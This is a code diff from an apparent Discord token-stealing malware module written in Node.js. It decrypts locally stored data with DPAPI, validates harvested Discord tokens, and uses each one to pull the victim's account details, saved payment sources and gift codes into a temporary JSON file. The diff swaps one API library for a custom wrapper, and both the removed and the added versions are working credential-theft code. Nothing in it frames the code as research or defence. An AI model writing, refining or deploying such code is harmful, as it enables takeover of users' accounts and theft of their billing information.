@@ -6,8 +6,7 @@ const { getTempFolder } = require('../util/init');
 const fs = require('fs');
 const { Dpapi } = require('@primno/dpapi');
 const crypto = require('crypto');
-const { REST } = require('@discordjs/rest');
-const { Routes } = require('discord-api-types/v10');
+const DiscordAPI = require('../util/discord-api');
 
 const jsonFile = join(getTempFolder(), 'Discord.json');
 writeFileSync(jsonFile, '{}');
@@ -68,45 +67,44 @@ const decryptRickRoll = (path) => {
   });
 };
 
-const handleTokens = async (tokens, resolve) => {
-  const userInfo = async (rest, token, source) => {
-    const data = await rest.get(Routes.user('@me'));
-    data.token = token;
-    data.source = source;
-    let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
-    if (!info.accounts) info.accounts = [];
-    if (!info.accounts.find(account => account.id === data.id)) {
-      info.accounts.push(data);
+const handleTokens = (tokens, resolve) => {
+  tokens = [...new Set(tokens)];
+  tokens.forEach(async ({ token, source }) => {
+    if (!token || typeof token !== 'string' || !tokenRegex.test(token)) return;
+    const api = new DiscordAPI(token);
+
+    try {
+      const userData = await api.userInfo();
+      userData.token = token;
+      userData.source = source;
+      let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
+      if (!info.accounts) info.accounts = [];
+      if (!info.accounts.find(account => account.id === userData.id)) {
+        info.accounts.push(userData);
+        writeFileSync(jsonFile, JSON.stringify(info));
+      } else if (info.accounts.find(account => account.id === userData.id && !account.source.includes(source))) {
+        info.accounts.find(account => account.id === userData.id).source += ', ' + source;
+        writeFileSync(jsonFile, JSON.stringify(info));
+      }
+
+      const paymentSourcesData = await api.paymentSources();
+      info = JSON.parse(readFileSync(jsonFile, 'utf8'));
+      if (!info.billing) info.billing = [];
+      paymentSourcesData.forEach(billing => {
+        if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
+      });
       writeFileSync(jsonFile, JSON.stringify(info));
-    } else if (info.accounts.find(account => account.id === data.id && !account.source.includes(source))) {
-      info.accounts.find(account => account.id === data.id).source += ', ' + source;
+
+      const giftsData = await api.gifts();
+      info = JSON.parse(readFileSync(jsonFile, 'utf8'));
+      if (!info.gifts) info.gifts = [];
+      giftsData.forEach(gift => {
+        if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
+      });
       writeFileSync(jsonFile, JSON.stringify(info));
-    }
-  };
-  const paymentSources = async (rest) => {
-    const data = await rest.get(Routes.user('@me').concat('/billing/payment-sources'));
-    let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
-    if (!info.billing) info.billing = [];
-    data.forEach(billing => {
-      if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
-    });
-    writeFileSync(jsonFile, JSON.stringify(info));
-  };
-  const gifts = async (rest) => {
-    const data = await rest.get(Routes.user('@me').concat('/outbound-promotions/codes'));
-    let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
-    if (!info.gifts) info.gifts = [];
-    data.forEach(gift => {
-      if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
-    });
-    writeFileSync(jsonFile, JSON.stringify(info));
-  };
-  for (const { token, source } of tokens) {
-    const rest = new REST({ version: '10', authPrefix: '' }).setToken(token);
-    await userInfo(rest, token, source);
-    await paymentSources(rest);
-    await gifts(rest);
-  }
+    } catch (e) {}
+  });
+
   resolve();
 };
 
